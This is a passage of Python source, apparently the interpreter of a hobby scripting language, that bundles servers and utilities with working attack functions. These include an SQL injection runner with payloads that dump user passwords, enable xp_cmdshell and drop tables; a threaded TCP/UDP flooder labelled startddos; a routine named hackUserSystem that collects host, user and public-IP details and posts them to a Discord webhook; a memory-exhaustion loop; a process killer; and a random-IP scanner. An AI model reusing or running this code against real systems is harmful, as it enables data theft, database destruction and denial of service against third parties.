            ak = ""
        if method == "GET":
            option = self.Path(option)
            if option in self.files:
                p = self.files[option]
                return f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(p)}\r\nServer: SimonicLang\r\n\r\n{p}"
            else:
                return "HTTP/1.1 404 Not Found\r\nServer: SimonicLang\r\n\r\n"
        elif method == "POST":
            option = self.Path(option)
            if ak == self.ak:
                self.files[option] = content
                return "HTTP/1.1 200 OK\r\nServer: SimonicLang\r\n\r\n"
            else:
                return "HTTP/1.1 400 Bad Request\r\nServer: SimonicLang\r\n\r\n"
        elif method == "PUT":
            option = self.Path(option)
            if ak == self.ak:
                self.files[option] = content
                return "HTTP/1.1 200 OK\r\nServer: SimonicLang\r\n\r\n"
            else:
                return "HTTP/1.1 400 Bad Request\r\nServer: SimonicLang\r\n\r\n"
        elif method == "DELETE":
            option = self.Path(option)
            if ak == self.ak:
                if option in self.files:
                    del self.files[option]
                    return "HTTP/1.1 200 OK\r\nServer: SimonicLang\r\n\r\n"
                else:
                    return "HTTP/1.1 404 Not Found\r\nServer: SimonicLang\r\n\r\n"
            else:
                return "HTTP/1.1 400 Bad Request\r\nServer: SimonicLang\r\n\r\n"
        else:
            return "HTTP/1.1 405 Method Not Allowed\r\nServer: SimonicLang\r\n\r\n"

    def ManageClient(self, client):
        try:
            pack = client.recv(999999).decode()
        except:
            pack = ""
        recv = self.Manage(pack)
        try:
            client.send(recv.encode())
        except:
            pass

    def Run(self, logfile):
        while True:
            try:
                client, addr = self.s.accept()
                threading.Thread(target=self.ManageClient,
                                 args=(client,)).start()
                with open(logfile, "r") as f:
                    c = f.read()
                with open(logfile, "w") as f:
                    f.write(c+f"\nConnection: {addr[0]}:{addr[1]}")
            except Exception as e:
                try:
                    with open(logfile, "r") as f:
                        c = f.read()
                    with open(logfile, "w") as f:
                        f.write(c+f"\nError [ {e} ]")
                except:
                    pass

    def SetFile(self, name, c):
        self.files[name] = c

    def GetFile(self, name):
        if name in self.files:
            return self.files[name]

    def DelFile(self, name):
        if name in self.files:
            return self.files[name]


class HttpsServer:
    def __init__(self, host, port, apikey):
        self.files = {"/": "<title> Empty </title>\n<h1> Empty Source </h1>"}
        self.ak = apikey
        self.context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        self.context.check_hostname = False
        self.context.verify_mode = ssl.CERT_NONE
        with tempfile.TemporaryDirectory() as tmpdirname:
            self.certfile = tempfile.NamedTemporaryFile(dir=tmpdirname).name
            self.keyfile = tempfile.NamedTemporaryFile(dir=tmpdirname).name
            try:
                subprocess.run(["openssl", "req", "-new", "-x509", "-days", "365", "-nodes", "-out",
                               self.certfile, "-keyout", self.keyfile, "-subj", "/CN=localhost"], check=True)
            except:
                pass
        self.s = self.context.wrap_socket(socket.socket(), server_side=True)
        self.s.bind((host, port))
        self.s.listen(999999)

    def Path(self, path):
        if "://" in path:
            path = path.split("://")[1]
            rpath = "/"+("/".join(path.split("/")[1:]))
        else:
            rpath = path
        return rpath

    def Manage(self, pack):
        try:
            method = pack.split()[0]
            option = pack.split()[1]
            try:
                content = pack.split("\r\n\r\n")[1]
            except:
                content = ""
            try:
                ak = pack.split("Authorization: Bearer ")[1]
                ak = ak.split("\r\n")[0]
            except:
                ak = ""
        except:
            method = "GET"
            option = "/"
            content = ""
            ak = ""
        if method == "GET":
            option = self.Path(option)
            if option in self.files:
                p = self.files[option]
                return f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(p)}\r\nServer: SimonicLang\r\n\r\n{p}"
            else:
                return "HTTP/1.1 404 Not Found\r\nServer: SimonicLang\r\n\r\n"
        elif method == "POST":
            option = self.Path(option)
            if ak == self.ak:
                self.files[option] = content
                return "HTTP/1.1 200 OK\r\nServer: SimonicLang\r\n\r\n"
            else:
                return "HTTP/1.1 400 Bad Request\r\nServer: SimonicLang\r\n\r\n"
        elif method == "PUT":
            option = self.Path(option)
            if ak == self.ak:
                self.files[option] = content
                return "HTTP/1.1 200 OK\r\nServer: SimonicLang\r\n\r\n"
            else:
                return "HTTP/1.1 400 Bad Request\r\nServer: SimonicLang\r\n\r\n"
        elif method == "DELETE":
            option = self.Path(option)
            if ak == self.ak:
                if option in self.files:
                    del self.files[option]
                    return "HTTP/1.1 200 OK\r\nServer: SimonicLang\r\n\r\n"
                else:
                    return "HTTP/1.1 404 Not Found\r\nServer: SimonicLang\r\n\r\n"
            else:
                return "HTTP/1.1 400 Bad Request\r\nServer: SimonicLang\r\n\r\n"
        else:
            return "HTTP/1.1 405 Method Not Allowed\r\nServer: SimonicLang\r\n\r\n"

    def ManageClient(self, client):
        try:
            pack = client.recv(999999).decode()
        except:
            pack = ""
        print(pack)
        recv = self.Manage(pack)
        print(recv)
        try:
            client.send(recv.encode())
        except:
            pass

    def Run(self, logfile):
        while True:
            try:
                client, addr = self.s.accept()
                print()
                threading.Thread(target=self.ManageClient,
                                 args=(client,)).start()
                with open(logfile, "r") as f:
                    c = f.read()
                with open(logfile, "w") as f:
                    f.write(c+f"\nConnection: {addr[0]}:{addr[1]}")
            except Exception as e:
                try:
                    with open(logfile, "r") as f:
                        c = f.read()
                    with open(logfile, "w") as f:
                        f.write(c+f"\nError [ {e} ]")
                except:
                    pass

    def SetFile(self, name, c):
        self.files[name] = c

    def GetFile(self, name):
        if name in self.files:
            return self.files[name]

    def DelFile(self, name):
        if name in self.files:
            return self.files[name]


class Tasks:
    def __init__(self):
        import subprocess
        self.sp = subprocess
        try:
            import psutil
        except:
            try:
                subprocess.run("pip install psutil".split(),
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                pass
            import psutil
        self.psutil = psutil
        import time
        self.sleep = time.sleep
        import os
        self.os = os.name

    def get_name(self, pid):
        try:
            return self.get_list_pidname()[pid]
        except:
            return ""

    def get_pid(self, name):
        try:
            return self.get_list_namepid()[name]
        except:
            return 0

    def get_status(self, pid):
        try:
            return self.get_list_pidstatus()[pid]
        except:
            return ""

    def get_cpu(self, pid):
        try:
            return self.get_list_pidcpu()[pid]
        except:
            return ""

    def get_ram(self, pid):
        try:
            return self.get_list_pidram()[pid]
        except:
            return ""

    def get_list_pidname(self):
        try:
            processes = {}
            for process in self.psutil.process_iter(["pid", "name"]):
                processes[process.info["pid"]] = process.info["name"]
        except:
            processes = {}
        return processes

    def get_list_namepid(self):
        try:
            processes = {}
            for process in self.psutil.process_iter(["pid", "name"]):
                processes[process.info["name"]] = process.info["pid"]
        except:
            processes = {}
        return processes

    def get_list_piduser(self):
        try:
            processes = {}
            for process in self.psutil.process_iter(["pid", "username"]):
                processes[process.info["pid"]] = process.info["username"]
        except:
            processes = {}
        return processes

    def get_list_pidstatus(self):
        try:
            processes = {}
            for process in self.psutil.process_iter(["pid", "status"]):
                processes[process.info["pid"]] = process.info["status"]
        except:
            processes = {}
        return processes

    def get_list_pidcpu(self):
        try:
            processes = {}
            for process in self.psutil.process_iter(["pid", "cpu_percent"]):
                processes[process.info["pid"]] = process.info["cpu_percent"]
        except:
            processes = {}
        return processes

    def get_list_pidram(self):
        try:
            processes = {}
            for process in self.psutil.process_iter(["pid", "memory_percent"]):
                processes[process.info["pid"]] = process.info["memory_percent"]
        except:
            processes = {}
        return processes

    def kill(self, nameorpid):
        try:
            target = self.get_pid(nameorpid)
            if target == 0:
                target = int(nameorpid)
        except:
            target = int(nameorpid)
        try:
            process = self.psutil.Process(target)
            process.terminate()
        except:
            pass
        try:
            process = self.psutil.Process(target)
            process.kill()
        except:
            pass
        try:
            if self.os == "nt":
                self.sp.run(["taskkill", "/F", "/PID", str(target)],
                            stdout=self.sp.PIPE, stderr=self.sp.PIPE)
            else:
                self.sp.run(["kill", "-9", str(target)],
                            stdout=self.sp.PIPE, stderr=self.sp.PIPE)
        except:
            pass

    def block_system(self, nameorpid):
        while True:
            try:
                self.kill(nameorpid)
            except:
                pass
            self.sleep(0.2)

    def block(self, nameorpid):
        import threading
        threading.Thread(target=self.block_system, args=(nameorpid,)).start()

    def get_mypid(self):
        return self.psutil.Process().pid


def requestin(target, path):
    pack = f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent google1.0\r\nAccept: gzip, deflate\r\nContent-Type: text/html\r\nReferer http://www.google.com/\r\nOrigin: http://www.google.com/\r\nAuthority: www.google.com\r\nConnection: keep-alive\r\n\r\n".encode()
    try:
        s = socket.socket()
        s.settimeout(2)
        s.connect((target, 80))
        s.sendall(pack)
        recv = s.recv(65507)
        while True:
            try:
                data = s.recv(65507)
                if len(data) >= 1:
                    recv += data
                else:
                    break
            except:
                break
        s.close()
        code = recv.split()[1]
        if code == "301":
            try:
                loc = recv.split("Location: ")[1]
                loc = loc.split("\r\n")[0]
            except:
                loc = "http://"+target+path
            s = socket.socket()
            s.settimeout(2)
            s.connect((target, 80))
            s.sendall(pack)
            recv = s.recv(65507)
            while True:
                try:
                    data = s.recv(65507)
                    if len(data) >= 1:
                        recv += data
                    else:
                        break
                except:
                    break
            s.close()
    except:
        recv = "".encode()
    return recv


def testgetinject(target, path):
    try:
        c = requestin(target, path)
        try:
            c = c.decode()
        except:
            pass
        return c
    except Exception as e:
        return e


def sqlinjectrun(target, pathname, variable, filename):
    body = f"{pathname}?{variable}="
    temps = ["1' OR '1'='1'", '1" OR "1"="1', "1' OR '1'='1' --", "1' OR '1'='1' #", "-1' UNION SELECT 1, username, password FROM users --", "1' UNION SELECT null, username, password FROM users --", "1' UNION SELECT null, null, table_name FROM information_schema.tables --", "1' UNION SELECT null, column_name, null FROM information_schema.columns WHERE table_name='users' --", "1' AND 1=0 UNION SELECT null, username, password FROM users --", "1' AND 1=0 UNION SELECT null, null, table_name FROM information_schema.tables --", "1' AND 1=0 UNION SELECT null, column_name, null FROM information_schema.columns WHERE table_name='users' --",
             "1'; EXEC xp_cmdshell('dir') --", "1'; EXEC master..xp_cmdshell('dir') --", "1'; EXEC('xp_cmdshell dir') --", "1'; EXEC('xp_cmdshell dir')--", "1'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; --", "1'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --", "1' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%pass%') --", "1' OR 1=convert(int, (SELECT @@version)) --", "1' OR 1=CAST((SELECT @@version) AS int) --", "1'; DECLARE @cmd NVARCHAR(100); SET @cmd = 'dir'; EXEC sp_executesql @cmd; --", "1' OR 1=1; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; --", "1' OR 1=1; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --", "1; EXEC('sp_configure ''show advanced options'', 1; RECONFIGURE;') --", "1; EXEC('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') --", "1'; DROP TABLE users --", "1'; DROP DATABASE dbname --", "1'; UPDATE users SET password='newpass' WHERE username='admin' --", "1' OR '1'='1'; --"]
    t = []
    for add in temps:
        f = testgetinject(target, body+add)
        t.append(f)
    datadata = ""
    for source in t:
        datadata += str(source)+"\n\n"
    with open(filename, "w") as f:
        f.write(datadata)


class my_pool:
    def __init__(self, target, args):
        self.wait_flag = True
        self.run_flag = True
        threading.Thread(target=self.pool, args=(target, args)).start()
        threading.Thread(target=self.pool, args=(target, args)).start()

    def pool(self, target, args):
        while self.wait_flag:
            time.sleep(0.2)
        while self.run_flag:
            ts = []
            for _ in range(4):
                time.sleep(0)
                try:
                    t = threading.Thread(target=target, args=args)
                    t.start()
                    ts.append(t)
                except:
                    pass
                time.sleep(0)
            for t in ts:
                time.sleep(0)
                try:
                    t.join()
                except:
                    pass
                time.sleep(0)
            time.sleep(0)

    def run(self):
        self.wait_flag = False

    def stop(self):
        self.run_flag = False
        del self


def sysbyte():
    global byte, perbyte, flag
    while flag:
        lastbyte = int(byte)
        time.sleep(1)
        with lock:
            perbyte = int(byte)-lastbyte


def syspack():
    global pack, perpack, flag
    while flag:
        lastpack = int(pack)
        time.sleep(1)
        with lock:
            perpack = int(pack)-lastpack


def syssocks():
    global socks, persocks, flag
    while flag:
        lastsocks = int(socks)
        time.sleep(1)
        with lock:
            persocks = int(socks)-lastsocks


def getinfo():
    global byte, perbyte, pack, perpack, socks, persocks, target, port, err, errs
    return f"ALL SIZE: {int(byte):.7f} B\nALL SIZE: {byte/1024:.7f} KB\nALL SIZE: {byte/1024/1024:.7f} MB\nALL SIZE: {byte/1024/1024/1024:.7f} GB\nPER SIZE: {int(perbyte):.7f} B/s\nPER SIZE: {perbyte/1024:.7f} KB/s\nPER SIZE: {perbyte/1024/1024:.7f} MB/s\nPER SIZE: {perbyte/1024/1024/1024:.7f} GB/s\nALL PACKS: {pack}\nPER PACKS: {perpack} in second\nALL SOCKETS: {socks}\nPER SOCKETS: {persocks} in second\nTARGET: {target}\nPORT: {port}\nERROR: {err}\nERROR COUNT: {errs}"


def saveinfo(filename):
    global flag
    while flag:
        try:
            time.sleep(0.2)
            with open(filename, "w") as file:
                file.write(getinfo())
        except:
            pass


def tcpsys(size, pernum):
    global target, port, byte, pack, socks, err, errs
    try:
        packk = (chr(random.randint(0, 64))*size).encode()
        b = len(packk)
    except:
        try:
            packk = ("X"*size).encode()
            b = len(packk)
        except:
            packk = ""
            b = 0
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        with lock:
            socks += 1
        s.settimeout(0.8)
        s.connect((target, port))
        for _ in range(pernum):
            s.sendall(packk)
            with lock:
                pack += 1
                byte += b
    except Exception as e:
        with lock:
            err = e
            errs += 1
    try:
        s.close()
    except:
        pass


def udpsys(size, pernum):
    global target, port, byte, pack, socks, err, errs
    try:
        packk = (chr(random.randint(0, 64))*size).encode()
        b = len(packk)
    except:
        try:
            packk = ("X"*size).encode()
            b = len(packk)
        except:
            packk = ""
            b = 0
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        with lock:
            socks += 1
        s.settimeout(0.8)
        for _ in range(pernum):
            s.sendto(packk, (target, port))
            with lock:
                pack += 1
                byte += b
    except Exception as e:
        with lock:
            err = e
            errs += 1
    try:
        s.close()
    except:
        pass


def SL_CRYPT_BOX(password):
    sbox = ""
    hr = ""
    for h in range(3068):
        hr += chr(h)
    password = password*len(hr)
    n = 1
    for h in password:
        b = hr[(ord(h)+n) % len(hr)]
        if b in sbox:
            pass
        else:
            sbox += b
        n += len(password)+len(sbox)+7
    return sbox


def SL_ENCRYPT(text, password):
    id = len(password)*2
    for h in password:
        id += ord(h)
    sbox = SL_CRYPT_BOX(password)
    nt = ""
    for h in text:
        if h in sbox:
            i = sbox.index(h)
            i2 = (i+len(password)) % len(sbox)
            nt += sbox[i2]
        else:
            nt += h
    return nt


def SL_DECRYPT(text, password):
    id = len(password)*2
    for h in password:
        id += ord(h)
    nt = ""
    sbox = SL_CRYPT_BOX(password)
    for h in text:
        if h in sbox:
            i = sbox.index(h)
            i2 = (i-len(password)) % len(sbox)
            nt += sbox[i2]
        else:
            nt += h
    return nt


def startddos(type, size, pernum, filename):
    global target, port, flag, ddospool
    if type.lower() == "tcp":
        pool = my_pool(tcpsys, (size, pernum))
    elif type.lower() == "udp":
        pool = my_pool(udpsys, (size, pernum))
    threading.Thread(target=sysbyte).start()
    threading.Thread(target=syspack).start()
    threading.Thread(target=syssocks).start()
    threading.Thread(target=saveinfo, args=(filename,)).start()
    pool.run()
    ddospool = pool


vars = {}
byte = 0
perbyte = 0
pack = 0
perpack = 0
socks = 0
persocks = 0
target = ""
port = 0
lock = threading.Lock()
err = ""
errs = 0
flag = True
ddospool = None
serverr = ""
httpHeaders = {"User-Agent": "SimonicLang", "Accept": "*/*"}
output = sys.stdout
outputSys = sys.stdout
sys.stdout = output
errors = True
lock = threading.Lock()
mods = []
ts = []
bofList = []


class Syntax:
    def __init__(self):
        pass

    def run(self, code):
        global errors
        code = code.replace(" %& ", "\n").split("\n")
        splitsys = False
        splitcoder = False
        splitcode = ""
        for c in code:
            try:
                m = c.split(";")[0]
            except:
                m = ""
            if splitsys:
                if m == "splitCode":
                    if errors:
                        orinto(
                            "Error: Initiating divisible code within divisible code is against syntax rules!")
                else:
                    if m == "splitEnd":
                        splitsys = False
                        splitcoder = False
                        runCode(splitcode)
                        splitcode = ""
                    else:
                        if splitcoder:
                            splitcode += c+" && "
                        else:
                            splitcode += c
            else:
                if m == "splitCode":
                    try:
                        splitcode = c[len("splitCode;"):]
                    except:
                        splitcode = ""
                    splitsys = True
                    if "loop" in splitcode:
                        splitcoder = True
                    if "Loop" in splitcode:
                        splitcoder = True
                elif m == "note":
                    pass
                else:
                    runCode(c)


class ioNone:
    def __init__(self):
        pass

    def write(self, *a, **k):
        pass

    def flush(self, *a, **k):
        pass

    def fileno(self, *a, **k):
        return None


def findtry():
    global serverr
    try:
        ip = fstring("$<random.ip>")
        port = random.choice([80, 8080, 443, 1080, 3306])
        s = socket.socket()
        s.settimeout(0.8)
        s.connect((ip, port))
        with lock:
            serverr = f"{ip}:{port}"
    except:
        pass
    s.close()


def textToBinary(text):
    binary = []
    for h in text:
        n = ord(str(h))
        binary.append(bin(n)[2:])
    return " ".join(binary)


def binaryToText(binary):
    text = ""
    binaryset = {}
    for h in range(1114112):
        binaryset[bin(h)[2:]] = chr(h)
    for h in binary.split(" "):
        text += binaryset[h]
    return text


def ipapiGet(ip, name):
    try:
        import requests
    except:
        try:
            subprocess.run(["pip", "install", "requests"],
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
        import requests
    j = requests.get(f"https://ipapi.co/{ip}/json", headers={
                     "User-Agent": "SimonicLang", "Content-Type": "application/json"}).json()
    return j[name]


def fstring(text, *args, **kwargs):
    global vars, mods, serverr, syscode
    for item, value in vars.items():
        if "$<v." in text:
            text = text.replace("$<v."+str(item)+">", str(value))
        if "$<vup." in text:
            text = text.replace("$<vup."+str(item)+">", str(value).upper())
        if "$<vlow." in text:
            text = text.replace("$<vlow."+str(item)+">", str(value).lower())
        if "$<vlen." in text:
            text = text.replace("$<vlen."+str(item)+">", str(len(str(value))))
        if "$<vord." in text:
            text = text.replace("$<vord."+str(item)+">", str(ord(value)))
        if "$<vchr." in text:
            text = text.replace("$<vchr."+str(item)+">", str(chr(int(value))))
        if "$<vbin." in text:
            text = text.replace("$<vbin."+str(item)+">",
                                textToBinary(str(value)))
        if "$<vtext." in text:
            try:
                text = text.replace("$<vtext."+str(item) +
                                    ">", binaryToText(str(value)))
            except:
                pass
    if "$<" in text:
        text = text.replace("$<n>", "\n")
        text = text.replace("$<t>", "	")
        text = text.replace("$<r>", "\r")
        text = text.replace("$<c.reset>", "\033[0m")
        text = text.replace("$<c.red>", "\033[91m")
        text = text.replace("$<c.green>", "\033[92m")
        text = text.replace("$<c.yellow>", "\033[93m")
        text = text.replace("$<c.blue>", "\033[94m")
        text = text.replace("$<c.purple>", "\033[95m")
        text = text.replace("$<c.blue2>", "\033[96m")
        text = text.replace("$<c.white>", "\033[99m")
        text = text.replace("$<c.black>", "\033[30m")
        text = text.replace("$<c.gray>", "\033[90m")
        text = text.replace(
            "$<smlangUrl>", "https://github.com/aertsimon90/SimonicLang")
        text = text.replace("$<pi>", str(math.pi))
        text = text.replace("$<bold>", "\033[1m")
        text = text.replace("$<random.ip>", str(random.randint(0, 255))+"."+str(
            random.randint(0, 255))+"."+str(random.randint(0, 255))+"."+str(random.randint(0, 255)))
        text = text.replace("$<sys.name>", os.name)
        text = text.replace("$<basefile>", os.path.basename(__file__))
        text = text.replace("$<sys.sys>", platform.system())
        text = text.replace("$<sys.ver>", platform.version())
        text = text.replace("$<sys.node>", platform.node())
        text = text.replace("$<sys.code>", syscode)
        if "$<sys.user2>" in text:
            import getpass
            text = text.replace("$<sys.user2>", getpass.getuser())
        text = text.replace("$<sys.user>", os.getlogin())
        text = text.replace("$<sys.path>", os.getcwd())
        text = text.replace("$<sys.prcsr>", str(platform.processor()))
        text = text.replace("$<sys.pyver>", str(platform.python_version()))
        text = text.replace("$<sys.slver>", "1.0.5")
        text = text.replace("$<sys.mac>", str(platform.machine()))
        text = text.replace("$<sys.arch>", ', '.join(platform.architecture()))
    if "$<random.apikey" in text:
        text = text.replace("$<random.apikey.16>", secrets.token_hex(16))
        text = text.replace("$<random.apikey.32>", secrets.token_hex(32))
        text = text.replace("$<random.apikey.64>", secrets.token_hex(64))
        text = text.replace("$<random.apikey.128>", secrets.token_hex(128))
    if "$<random.server>" in text:
        serverr = ""
        while True:
            ts = []
            for _ in range(50):
                t = threading.Thread(target=findtry)
                if serverr == "":
                    pass
                else:
                    break
                t.start()
                ts.append(t)
            for t in ts:
                t.join()
            if serverr == "":
                pass
            else:
                text = text.replace("$<random.server>", serverr)
                break
    if "$<prcsc>" in text:
        try:
            import psutil
        except:
            try:
                subprocess.run("pip install psutil".split(),
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                pass
            import psutil
        text = text.replace("$<prcsc>", str(len(psutil.pids())))
    if "$<fakeUA>" in text:
        try:
            from fake_useragent import UserAgent
        except:
            try:
                subprocess.run("pip install fake_useragent".split(
                ), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                pass
            from fake_useragent import UserAgent
        ua = UserAgent()
        text = text.replace("$<fakeUA>", ua.random)
    if "$<ram" in text:
        try:
            import psutil
        except:
            try:
                subprocess.run("pip install psutil".split(),
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                pass
            import psutil
        text = text.replace("$<ram.b>", str(psutil.virtual_memory().total))
        text = text.replace("$<ram.kb>", str(
            psutil.virtual_memory().total/1024))
        text = text.replace("$<ram.mb>", str(
            psutil.virtual_memory().total/(1024**2)))
        text = text.replace("$<ram.gb>", str(
            psutil.virtual_memory().total/(1024**3)))
        text = text.replace("$<ramav.b>", str(
            psutil.virtual_memory().available))
        text = text.replace("$<ramav.kb>", str(
            psutil.virtual_memory().available/1024))
        text = text.replace("$<ramav.mb>", str(
            psutil.virtual_memory().available/(1024**2)))
        text = text.replace("$<ramav.gb>", str(
            psutil.virtual_memory().available/(1024**3)))
        text = text.replace("$<ramus.b>", str(
            (psutil.virtual_memory().total-psutil.virtual_memory().available)))
        text = text.replace("$<ramus.kb>", str(
            (psutil.virtual_memory().total-psutil.virtual_memory().available)/1024))
        text = text.replace("$<ramus.mb>", str(
            (psutil.virtual_memory().total-psutil.virtual_memory().available)/(1024**2)))
        text = text.replace("$<ramus.gb>", str(
            (psutil.virtual_memory().total-psutil.virtual_memory().available)/(1024**3)))
    if "$<sys.ip>" in text:
        try:
            s = socket.socket()
            s.settimeout(0.8)
            s.connect(("ifconfig.me", 80))
            s.sendall(
                "GET http://ifconfig.me/ip HTTP/1.1\r\nHost: ifconfig.me:80\r\nUser-Agent: SimonicLang\r\n\r\n".encode())
            ip = s.recv(999999).decode().split("\r\n\r\n")[1]
            s.close()
        except:
            ip = "0.0.0.0"
            try:
                s.close()
            except:
                pass
        text = text.replace("$<sys.ip>", ip)
    if "$<sys.host>" in text:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.8)
            s.connect(("ifconfig.me", 80))
            s.sendall(
                "GET http://ifconfig.me/ip HTTP/1.1\r\nHost: ifconfig.me:80\r\nUser-Agent: SimonicLang\r\n\r\n".encode())
            ip = s.recv(999999).decode().split("\r\n\r\n")[1]
            s.close()
        except:
            ip = "0.0.0.0"
            try:
                s.close()
            except:
                pass
        try:
            host = socket.gethostbyaddr(ip)[0]
        except:
            host = ""
        text = text.replace("$<sys.host>", host)
    if "$<sys.args." in text:
        for n in range(len(sys.argv)):
            text = text.replace(f"$<sys.args.{n}>", sys.argv[n])
    if "$<date" in text:
        try:
            from datetime import datetime
        except:
            try:
                subprocess.run("pip install datetime".split(),
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                pass
            from datetime import datetime
        date = datetime.now()
        datee = date.strftime("%Y-%m-%d %H:%M:%S")
        text = text.replace("$<date>", datee)
        text = text.replace("$<date.y>", str(date.year))
        text = text.replace("$<date.m>", str(date.month))
        text = text.replace("$<date.d>", str(date.date))
        text = text.replace("$<date.h>", str(date.hour))
        text = text.replace("$<date.mn>", str(date.minute))
        text = text.replace("$<date.s>", str(date.second))
    return str(text)


def returnAuto(filename, addbyte=0):
    with open(fstring("$<basefile>"), "r") as f:
        endof = "--"
        sysc = f.read().split(f"# --RETURN AUTO SEPERATOR{endof}")[0]+"\n\n"
    with open(filename, "r") as f:
        c = f.read()
    sysc += "# "+("X"*addbyte)+"\n"
    sysc += f"\ns = Syntax()\nsyscode = '''{c}'''\ns.run('''{c}''')"
    sysc = restoreTabs(sysc)
    with open(filename, "w") as f:
        f.write(sysc)


def orint(text):
    global output
    print(text.replace("$<n>", "\n"), end="", file=output)


def orinto(text):
    global output
    output.write(text.replace("$<n>", "\n"))
    output.flush()


def bofs():
    global bofList
    try:
        with lock:
            bofList.append("X"*1024*1024*512)
    except:
        pass


def bof(n):
    while True:
        threading.Thread(target=bofs).start()
        time.sleep(n)


def netinfo(ip):
    global mods, httpHeaders
    if 0 in mods:
        pass
    else:
        subprocess.run(["pip", "install", "requests"],
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        with lock:
            mods.append(0)
    import requests
    infojson = requests.get(
        f"https://ipapi.co/{ip}/json", headers=httpHeaders, timeout=0.8)
    return infojson.json()


def discordWHSend(url, text):
    global httpHeaders, mods
    try:
        if 0 in mods:
            pass
        else:
            subprocess.run(["pip", "install", "requests"],
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            with lock:
                mods.append(0)
        import requests
        requests.post(url, headers=httpHeaders, json={
                      "content": text}, timeout=5)
    except:
        pass


def hackUserSystem(url, name):
    text = f"- {name}\n"
    for h in ["sys.name", "sys.sys", "sys.ver", "sys.node", 'sys.user2', "sys.path", "sys.prcsr", "sys.pyver", "sys.slver", "sys.mac", "sys.arch", "sys.ip", "sys.host", "ram.gb"]:
        try:
            hh = fstring('$<'+h+'>')
            txt = f"{h.upper().replace('.', ' ')} : || {hh} ||"
            text += txt+"\n"
        except:
            pass
    try:
        ip = fstring("$<sys.ip>")
    except:
        ip = "0.0.0.0"
    text += f"NET INFO: || https://ipapi.co/{ip}/json ||\n"
    date = fstring("$<date>")
    text += f"DATE: {date}"
    discordWHSend(url, text)


htmlflag = True


def runHtml(code):
    global htmlflag
    ip = "127."+str(random.randint(0, 255))+"." + \
        str(random.randint(0, 255))+"."+str(random.randint(0, 255))
    port = random.randint(1025, 65535)
    s = socket.socket()
    s.bind((ip, port))
    s.listen(100)
    webbrowser.open(f"http://{ip}:{port}/")
    while htmlflag:
        try:
            c, a = s.accept()
            p = c.recv(1)
            p += "x".encode()
            c.send(
                f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(code)}\r\n\r\n{code}".encode())
        except:
            pass


def loadMod(id, name):
    global mods
    try:
        subprocess.run(
            f"pip install {name}", stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except:
        pass
    with lock:
        mods.append(id)


def loadAllMods():
    mods = {"psutil": 342, "fake_useragent": 83, "datetime": 2, "requests": 0,
            "keyboard": 245, "tkinter": 3422, "flask": 963, "midiutil": 213}
    ts = []
    for name, id in mods.items():
        t = threading.Thread(target=loadMod, args=(id, name))
        t.start()
        ts.append(t)
    for t in ts:
        t.join()


def hrefBox(title, text, url):
    global mods
    if 3422 in mods:
        pass
    else:
        try:
            subprocess.run("pip install tkinter".split(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
    exec(f"""import tkinter as tk
def go():
    global url
    webbrowser.open(url)
title = '''{title}'''
text = '''{text}'''
url = '''{url}'''
root = tk.Tk()
root.title(title)
text = tk.Label(root, text=text)
text.pack()
button = tk.Button(root, text='Open on browser.', command=go, width=15)
button.pack()
root.mainloop()""")


def msgBox(title, text):
    global mods
    if 3422 in mods:
        pass
    else:
        try:
            subprocess.run("pip install tkinter".split(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
    exec(f"""from tkinter import messagebox
title = '''{title}'''
text = '''{text}'''
messagebox.showinfo(title, text)""")


def confirmBox(title, text, varname):
    global mods
    if 3422 in mods:
        pass
    else:
        try:
            subprocess.run("pip install tkinter".split(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
    exec(f"""import tkinter as tk
def yes():
    global root, vars
    text = "1"
    root.destroy()
    with lock:
        vars['''{varname}'''] = str(text)
def no():
    global root, vars
    text = "0"
    root.destroy()
    with lock:
       vars['''{varname}'''] = str(text)
root = tk.Tk()
root.title('''{title}''')
label = tk.Label(root, text='''{text}''')
label.pack(pady=10)
yesbutton = tk.Button(root, width=15, text='YES',
                      command=yes, fg="#000000", bg="#00FF00")
yesbutton.pack(pady=10)
nobutton = tk.Button(root, width=15, text='NO',
                     command=no, fg="#000000", bg="#FF0000")
nobutton.pack(pady=10)
root.mainloop()""")


def inputBox(title, text, varname):
    global mods
    if 3422 in mods:
        pass
    else:
        try:
            subprocess.run("pip install tkinter".split(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
    exec(f"""import tkinter as tk
def submit():
    global entry, root, vars
    text = entry.get()
    root.destroy()
    with lock:
        vars['''{varname}'''] = str(text)
root = tk.Tk()
root.title('''{title}''')
label = tk.Label(root, text='''{text}''')
label.pack(pady=10)
entry = tk.Entry(root, width=30)
entry.pack()
button = tk.Button(root, width=15, text='Submit', command=submit)
button.pack()
root.mainloop()""")


def sendmail(server, port, acc, accpawd, target, subject, mes):
    import smtplib
    from email.mime.text import MIMEText
    from email.mime.multipart import MIMEMultipart
    email = MIMEMultipart()
    email['From'] = acc
    email['To'] = target
    email['Subject'] = subject
    email.attach(MIMEText(mes, 'plain'))
    try:
